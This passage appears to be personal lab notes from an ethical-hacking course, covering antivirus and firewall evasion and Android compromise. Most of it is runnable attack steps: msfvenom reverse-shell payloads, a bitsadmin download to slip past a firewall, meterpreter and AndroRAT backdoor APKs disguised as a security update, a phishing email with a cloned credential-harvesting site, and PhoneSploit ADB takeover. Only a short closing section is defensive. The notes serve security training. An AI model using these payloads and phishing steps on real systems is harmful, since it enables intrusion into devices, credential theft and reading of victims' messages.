+ In a new terminal generate a payload using new template by the following command
  + msfvenom -p windows/shell_reverse_tcp lhost=10.10.1.13 lport=444 -x /usr/share/metasploit-framework/data/templates/src/pe/exe/evasion.exe -f exe > /home/attacker/bypass.exe
+ Upload the bypass.exe file and notice the number of antivirus that have detected the virus

### Task 4: Bypass Firewall through Windows BITSAdmin

+ Login to `Windows Server 2019` with `Administrator`
+ Enable the Firewall
+ Open the `terminal`
+ sudo su
+ msfvenom -p windows/meterpreter/reverse_tcp lhost=10.10.1.13 lport=444 -f exe > /home/attacker/Exploit.exe
+ mkdir /var/www/html/share
+ chmod -R 755 /var/www/html/share
+ chown -R www-data:www-data /var/www/html/share
+ cp /home/attacker/Exploit.exe /var/www/html/share
+ service apache2 start
+ Open `Powershell` on `Windows Server 2019` with `Administrator`
+ bitsadmin /transfer Exploit.exe http://10.10.1.13/share/Exploit.exe c:\Exploit.exe

---

# Module 17: Hacking Mobile Platforms

## Lab 1: Hack Android Devices

### Task 1: Hack an Android device by creating binary payloads using Parrot Security

+ Open the `terminal`
+ sudo su
+ cd
+ service postgresql start
+ msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk
+ mkdir /var/www/html/share
+ chmod -R 755 /var/www/html/share
+ chown -R www-data:www-data /var/www/html/share
+ cp /root/Desktop/Backdoor.apk /var/www/html/share/
+ service apache2 start
+ msfconsole
+ use exploit/multi/handler
+ set payload android/meterpreter/reverse_tcp
+ set LHOST 10.10.1.13
+ exploit -j -z
+ Switch to `Android` and Turn off Play Protect
+ Launch `Chrome` and navigate to `http://10.10.1.13/share`
+ Install `Backdoor.apk` and run the application
+ Notice the `meterpreter` has opened on `Parrot`
+ sessions -i 1
+ sysinfo
+ ipconfig
+ pwd
+ cd /sdcard
+ pwd
+ ps

### Task 2: Harvest Users’ Credentials using the Social-Engineer Toolkit

+ Open the `terminal`
+ sudo su
+ cd social-engineer-toolkit
+ ./setoolkit
+ The `SET` menu appears, as shown in the screenshot. Type `1` and press `Enter` to choose `Social-Engineering Attacks`
+ A list of options for `Social-Engineering Attacks` appears; type `2` and press `Enter` to choose `Website Attack Vectors`
+ A list of options in `Website Attack Vectors` appears; type `3` and press `Enter` to choose `Credential Harvester Attack Method`
+ Type `2` and press `Enter` to choose `Site Cloner` from the menu
+ Type the IP address of the local machine (`10.10.1.13`) in the prompt for “`IP address for the POST back in Harvester/Tabnabbing`” and press `Enter`
+ Now, you will be prompted for the URL to be cloned; type the desired URL in “`Enter the url to clone`” and press `Enter`. In this task, we will clone the URL `http://certifiedhacker.com/Online%20Booking/index.htm`
+ Login to gmail using firefox and craft an email
  
      Reciepient: 
      Subject: SECURE YOUR ONLINE BOOKING ACCOUNT
      Message: 
      Hi, Team

      We are writing to inform you that your password for your online booking account has expired, as a result, it is no longer valid.

      This email has been sent to safeguard your account against any unauthorised activity. To Change your account password, click the below link to navigate to your account and change password.

      [http://www.bookhotel.com/change_account_password] (http://10.10.1.13)

+ Send the email to the intended reciepient
+ Login to the `Android`
+ Open `Chrome` and login to `gmail`
+ Click and open the malicious link
+ Enters the Username and Password and clicks Login
+ In the terminal window, scroll down to find an Username and Password

### Task 4: Exploit the Android platform through ADB using PhoneSploit

+ Open the `terminal`
+ sudo su
+ cd PhoneSploit
+ python3 -m pip install colorama
+ python3 phonesploit.py
+ Type `3` and press `Enter` to select `[3] Connect a new phone option`
+ When prompted to `Enter a phones ip address`, type the target Android device’s IP address (in this case, `10.10.1.14`) and press `Enter`
  + Enter `3` until you get `Enter a phones ip address option`
+ Now, at the `main_menu` prompt, type `4` and press `Enter` to choose `Access Shell on a phone`
+ When prompted to `Enter a device name`, type the target Android device’s IP address (in this case, `10.10.1.14`) and press `Enter`
+ pwd
+ ls
+ cd sdcard
+ ls
+ cd Download
+ ls
+ exit
+ At the `main_menu` prompt, type `7` and press `Enter` to choose `Screen Shot a picture on a phone`
+ When prompted to `Enter a device name`, type the target Android device’s IP address (in this case, `10.10.1.14`) and press `Enter`
+ When prompted to `Enter where you would like the screenshot to be saved`, type `/home/attacker/Desktop` as the location and press `Enter`. The screenshot of the target mobile device will be saved in the given location. Minimize the Terminal window
+ Click `Places` in the top section of the Desktop; then, from the context menu, click `Desktop`
+ At the` main_menu` prompt, type `14` and press `Enter` to choose `List all apps on a phone`
+ When prompted to `Enter a device name`, type the target Android device’s IP address (in this case, `10.10.1.14`) and press `Enter`
+ Now, at the main_menu prompt, type `15` and press `Enter` to choose `Run an app`. In this example, we will launch a calculator app on the target Android device
+ When prompted to `Enter a device name`, type the target Android device’s IP address (in this case, `10.10.1.14`) and press `Enter`
+ To launch the `calculator app`, type `com.android.calculator2` and press `Enter`
+ View that the `calculator app` is launched on the `Android`
+ In the `Terminal` window, type `p` and press `Enter` to navigate to `additional PhoneSploit options` on the `Next Page`
+ At the `main_menu` prompt, type `18` and press `Enter` to choose `Show Mac/Inet information for the target Android device`
+ When prompted to `Enter a device name`, type the target Android device’s IP address (in this case, `10.10.1.14`) and press `Enter`
+ Now, at the `main_menu` prompt, type `21` and press `Enter` to choose the `NetStat option`
+ When prompted to `Enter a device name`, type the target Android device’s IP address (in this case, `10.10.1.14`) and press `Enter`

### Task 5: Hack an Android Device by Creating APK File using AndroRAT

+ Open the `terminal`
+ sudo su
+ cd AndroRAT
+ python3 androRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
  + --build: is used for building the APK
  + -i: specifies the local IP address (here, 10.10.1.13)
  + -p: specifies the port number (here, 4444)
  + -o: specifies the output APK file (here, SecurityUpdate.apk)
+ mkdir /var/www/html/share
+ chmod -R 755 /var/www/html/share
+ chown -R www-data:www-data /var/www/html/share
+ cp /home/attacker/AndroRAT/SecurityUpdate.apk /var/www/html/share/
+ service apache2 start
+ python3 androRAT.py --shell -i 0.0.0.0 -p 4444
  + --shell: is used for getting the interpreter
  + -i: specifies the IP address for listening (here, 0.0.0.0)
  + -p: specifies the port number (here, 4444)
+ Switch to `Android` and Turn off Play Protect
+ Launch `Chrome` and navigate to `http://10.10.1.13/share`
+ Install `SecurityUpdate.apk` and run the application
+ Notice the `Interpreter` has opened on `Parrot`
+ help
+ deviceInfo
+ getSMS inbox
+ getMACAddress
+ exit

## Lab 2: Secure Android Devices using Various Android Security Tools

### Task 1: Analyze a malicious app using online Android analyzers

+ Open `https://www.sisik.eu/apk-tool` on `FireFox` in `Parrot`
+ Upload the APK files
  + /var/www/html/share/Backdoor.apk
+ View the relavant information

#### Create Backdoor.apk

+ Open the `terminal`
+ sudo su
+ cd
+ service postgresql start
+ msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 R > Desktop/Backdoor.apk

### Task 2: Secure Android devices from malicious apps using Malwarebytes Security

+ Turn off Play Protect
+ Download the Malwarebytes Security Application from the following link `https://apk.gold/download?file_id=2274206/malwarebytes-anti-malware`
+ Run the Malwarebytes Application
+ Click `Scan Now`
+ Click `Remove Selected`

---

# Things to note

Module 08 Lab 3: Detect Network Sniffing
  - Task 2: Detect ARP Poisoning using the Capsa Network Analyzer
    - Download Link: https://www.colasoft.com/download/capsaent.zip 
    - License Key: {{Secret.key}}

Module 17 Lab 2: Secure Android Devices using Various Android Security Tools
  - Task 2: Secure Android devices from malicious apps using Malwarebytes Security
    - https://apk.gold/download?file_id=2274206/malwarebytes-anti-malware 